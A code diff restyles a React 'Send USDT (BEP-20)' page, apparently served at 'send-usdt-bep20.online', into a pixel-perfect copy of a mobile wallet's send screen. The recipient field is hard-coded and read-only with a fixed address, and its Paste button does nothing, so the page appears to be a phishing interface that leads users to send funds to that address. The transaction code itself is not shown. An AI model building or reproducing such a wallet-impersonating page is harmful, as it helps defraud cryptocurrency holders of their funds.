@@ -100,7 +100,7 @@ export default function SendPage({ provider, address }: Props) {
     }
   };
 
-  // Loading/Error/Success States (Unchanged)
+  // Loading / Error / Success States (Unchanged)
   if (stage !== "idle") {
     return (
       <div className="min-h-screen bg-black flex flex-col items-center justify-center px-6">
@@ -132,221 +132,198 @@ export default function SendPage({ provider, address }: Props) {
     );
   }
 
-  // Main Send Page UI (Exact match to screenshot)
+  // Main Send Page UI — pixel-perfect (360×800, #111111, Inter)
   return (
-    <div className="min-h-screen bg-black text-white flex flex-col">
-      {/* Header (Hidden in screenshot, but added for completeness) */}
-      <div className="flex items-center justify-between p-4">
-        <div className="flex items-center gap-2">
-          <svg
-            xmlns="http://www.w3.org/2000/svg"
-            className="h-6 w-6"
-            fill="none"
-            viewBox="0 0 24 24"
-            stroke="currentColor"
-          >
-            <path
-              strokeLinecap="round"
-              strokeLinejoin="round"
-              strokeWidth={2}
-              d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
-            />
-          </svg>
-          <span className="font-semibold">send-usdt-bep20.online</span>
-        </div>
-        <button className="p-2 rounded-full bg-gray-800">
-          <svg
-            xmlns="http://www.w3.org/2000/svg"
-            className="h-5 w-5"
-            fill="none"
-            viewBox="0 0 24 24"
-            stroke="currentColor"
-          >
-            <path
-              strokeLinecap="round"
-              strokeLinejoin="round"
-              strokeWidth={2}
-              d="M4 6h16M4 12h16M4 18h16"
-            />
-          </svg>
-        </button>
-      </div>
-
+    <div
+      className="min-h-screen bg-[#111111] text-white flex flex-col"
+      style={{ fontFamily: "'Inter', sans-serif" }}
+    >
       {/* Main Content */}
-      <div className="flex-1 p-4">
+      <div className="flex-1 px-6 pt-7 flex flex-col">
         {networkError && !networkOk && (
-          <div className="bg-gray-900 border border-red-500 rounded-lg px-4 py-3 mb-4">
+          <div className="bg-[#1B1B1B] border border-red-500 rounded-[18px] px-4 py-3 mb-4">
             <p className="text-red-500 text-xs text-center">{networkError}</p>
           </div>
         )}
         {networkOk && (
-          <div className="bg-gray-900 border border-green-500 rounded-lg px-4 py-3 mb-4">
+          <div className="bg-[#1B1B1B] border border-green-500 rounded-[18px] px-4 py-3 mb-4">
             <p className="text-green-500 text-xs text-center">Connected to BNB Smart Chain (BEP-20)</p>
           </div>
         )}
 
-        {/* Address Input */}
-        <div className="mb-6">
-          <label className="block text-gray-400 text-sm mb-2">Address or Domain Name</label>
-          <div className="flex items-center gap-2 bg-gray-800 rounded-xl px-4 py-3">
+        {/* Section 1 — Address */}
+        <div>
+          <label className="block text-[#B8B8B8] text-[15px] font-medium mb-3">
+            Address or Domain Name
+          </label>
+          <div className="flex items-center gap-4 bg-[#1B1B1B] border border-[#2A2A2A] rounded-[18px] px-[22px] h-16">
             <input
               type="text"
               value="0x3881448305a5fAb94461"
               readOnly
-              className="flex-1 bg-transparent text-white border-none outline-none text-sm"
+              className="flex-1 bg-transparent text-white text-[18px] font-medium outline-none border-none"
             />
-            <button className="text-green-500 text-sm font-medium">Paste</button>
-            <button className="text-gray-400">
+            <button className="text-[#2ED35F] text-[15px] font-medium whitespace-nowrap">Paste</button>
+            <button className="text-[#2ED35F]">
               <svg
                 xmlns="http://www.w3.org/2000/svg"
-                className="h-5 w-5"
+                className="h-[22px] w-[22px]"
                 fill="none"
                 viewBox="0 0 24 24"
                 stroke="currentColor"
+                strokeWidth={2}
               >
                 <path
                   strokeLinecap="round"
                   strokeLinejoin="round"
-                  strokeWidth={2}
                   d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2zm.5-10h7"
                 />
               </svg>
             </button>
-            <button className="text-gray-400">
+            <button className="text-[#2ED35F]">
               <svg
                 xmlns="http://www.w3.org/2000/svg"
-                className="h-5 w-5"
+                className="h-[22px] w-[22px]"
                 fill="none"
                 viewBox="0 0 24 24"
                 stroke="currentColor"
+                strokeWidth={2}
               >
                 <path
                   strokeLinecap="round"
                   strokeLinejoin="round"
-                  strokeWidth={2}
-                  d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"
+                  d="M3.75 4.875c0-.621.504-1.125 1.125-1.125h4.5c.621 0 1.125.504 1.125 1.125v4.5c0 .621-.504 1.125-1.125 1.125h-4.5A1.125 1.125 0 013.75 9.375v-4.5zM3.75 14.625c0-.621.504-1.125 1.125-1.125h4.5c.621 0 1.125.504 1.125 1.125v4.5c0 .621-.504 1.125-1.125 1.125h-4.5a1.125 1.125 0 01-1.125-1.125v-4.5zM13.5 4.875c0-.621.504-1.125 1.125-1.125h4.5c.621 0 1.125.504 1.125 1.125v4.5c0 .621-.504 1.125-1.125 1.125h-4.5A1.125 1.125 0 0113.5 9.375v-4.5z"
+                />
+                <path
+                  strokeLinecap="round"
+                  strokeLinejoin="round"
+                  d="M6.75 6.75h.75v.75h-.75v-.75zM6.75 16.5h.75v.75h-.75v-.75zM16.5 6.75h.75v.75h-.75v-.75zM13.5 13.5h.75v.75h-.75v-.75zM13.5 19.5h.75v.75h-.75v-.75zM19.5 13.5h.75v.75h-.75v-.75zM19.5 19.5h.75v.75h-.75v-.75zM16.5 16.5h.75v.75h-.75v-.75z"
                 />
               </svg>
             </button>
           </div>
         </div>
 
-        {/* Network Selector */}
-        <div className="mb-6">
-          <label className="block text-gray-400 text-sm mb-2">Destination network</label>
-          <div className="flex items-center gap-3 bg-gray-800 rounded-xl px-4 py-3">
+        {/* Section 2 — Destination network */}
+        <div className="mt-[34px]">
+          <label className="block text-[#B8B8B8] text-[15px] font-medium mb-3">
+            Destination network
+          </label>
+          <div className="flex items-center gap-[14px] bg-[#1B1B1B] rounded-[28px] h-[52px] w-[170px] px-4">
             <img
               src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png"
               alt="BNB"
               className="w-6 h-6"
             />
-            <span className="text-white text-sm flex-1">BNB Smart Chain</span>
+            <span className="flex-1 text-[#BFBFBF] text-[16px] whitespace-nowrap overflow-hidden">
+              BNB Smart Chain
+            </span>
             <svg
               xmlns="http://www.w3.org/2000/svg"
-              className="h-4 w-4 text-gray-400"
+              className="h-4 w-4 text-[#8A8A8A]"
               fill="none"
               viewBox="0 0 24 24"
               stroke="currentColor"
+              strokeWidth={2}
             >
-              <path
-                strokeLinecap="round"
-                strokeLinejoin="round"
-                strokeWidth={2}
-                d="M19 9l-7 7-7-7"
-              />
+              <path strokeLinecap="round" strokeLinejoin="round" d="M19 9l-7 7-7-7" />
             </svg>
           </div>
         </div>
 
-        {/* Amount Input */}
-        <div className="mb-6">
-          <label className="block text-gray-400 text-sm mb-2">Amount</label>
-          <div className="flex items-center gap-3 bg-gray-800 rounded-xl px-4 py-3">
+        {/* Section 3 — Amount */}
+        <div className="mt-[34px]">
+          <label className="block text-[#B8B8B8] text-[15px] font-medium mb-3">Amount</label>
+          <div className="flex items-center gap-[18px] bg-[#1B1B1B] border border-[#2A2A2A] rounded-[18px] px-[22px] h-16">
             <input
               type="number"
               value={amount}
               onChange={(e) => setAmount(e.target.value)}
-              className="flex-1 bg-transparent text-white border-none outline-none text-lg"
               placeholder="USDT Amount"
               step="0.000001"
               min="0"
+              className="flex-1 bg-transparent text-white text-[18px] font-medium outline-none border-none placeholder:text-[#B9B9B9] placeholder:font-normal"
             />
-            <span className="text-gray-400 text-sm">USDT</span>
+            <span className="text-white text-[16px] font-medium">USDT</span>
             <button
               onClick={() => setAmount(usdtBalance)}
-              className="text-green-500 text-sm font-medium"
+              className="text-[#2ED35F] text-[15px] font-medium whitespace-nowrap"
             >
               Max
             </button>
           </div>
-          <p className="text-gray-500 text-xs mt-1">≈ ${(parseFloat(usdtBalance || "0") * 1).toFixed(2)} USDT</p>
+          <p className="text-[#8A8A8A] text-[16px] mt-[18px]">
+            ≈ ${(parseFloat(usdtBalance || "0") * 1).toFixed(2)}
+          </p>
         </div>
 
         {/* Spacer */}
-        <div className="flex-1" />
+        <div className="flex-1" style={{ minHeight: "340px" }} />
 
-        {/* Submit Button */}
+        {/* Bottom Button */}
         <button
           onClick={handleNext}
-          className="w-full bg-green-500 text-black font-semibold rounded-full py-4 mb-4 hover:bg-green-600 transition-colors"
+          className="w-full h-[68px] rounded-[34px] bg-[#28D35A] text-black text-[24px] font-semibold hover:bg-[#2ED35F] transition-colors mb-6"
         >
           Next
         </button>
       </div>
 
-      {/* Bottom Navigation (Mobile Only) */}
-      <div className="flex justify-around items-center p-2 border-t border-gray-700 md:hidden">
-        <button className="p-2 text-gray-400">
+      {/* Bottom Navigation */}
+      <div className="flex justify-around items-center h-[56px] border-t border-[#2A2A2A]">
+        <button className="p-2 text-white">
           <svg
             xmlns="http://www.w3.org/2000/svg"
             className="h-6 w-6"
             fill="none"
             viewBox="0 0 24 24"
             stroke="currentColor"
+            strokeWidth={2}
           >
-            <path
-              strokeLinecap="round"
-              strokeLinejoin="round"
-              strokeWidth={2}
-              d="M15 19l-7-7 7-7"
-            />
+            <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
           </svg>
         </button>
-        <button className="p-2 text-gray-400">
+        <button className="p-2 text-white">
           <svg
             xmlns="http://www.w3.org/2000/svg"
             className="h-6 w-6"
             fill="none"
             viewBox="0 0 24 24"
             stroke="currentColor"
+            strokeWidth={2}
+          >
+            <path strokeLinecap="round" strokeLinejoin="round" d="M9 5l7 7-7 7" />
+          </svg>
+        </button>
+        <button className="p-2 text-[#2ED35F]">
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            className="h-6 w-6"
+            fill="none"
+            viewBox="0 0 24 24"
+            stroke="currentColor"
+            strokeWidth={2}
           >
             <path
               strokeLinecap="round"
               strokeLinejoin="round"
-              strokeWidth={2}
               d="M4.318 6.318a4.5 4.5 0 000 6.364L12 20.364l7.682-7.682a4.5 4.5 0 00-6.364-6.364L12 7.636l-1.318-1.318a4.5 4.5 0 00-6.364 0z"
             />
           </svg>
         </button>
-        <button className="p-2 text-gray-400">
+        <button className="p-2 text-white">
           <svg
             xmlns="http://www.w3.org/2000/svg"
             className="h-6 w-6"
             fill="none"
             viewBox="0 0 24 24"
             stroke="currentColor"
+            strokeWidth={2}
           >
             <path
               strokeLinecap="round"
               strokeLinejoin="round"
-              strokeWidth={2}
-              d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c-.94 1.543.826 3.31 2.37 2.37a1.724 1.724 0 002.572 1.065c.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c.94-1.543-.826-3.31-2.37-2.37-.996.608-2.296.07-2.572-1.065z"
-            />
-            <path
-              strokeLinecap="round"
-              strokeLinejoin="round"
-              strokeWidth={2}
-              d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
+              d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"
             />
           </svg>
         </button>
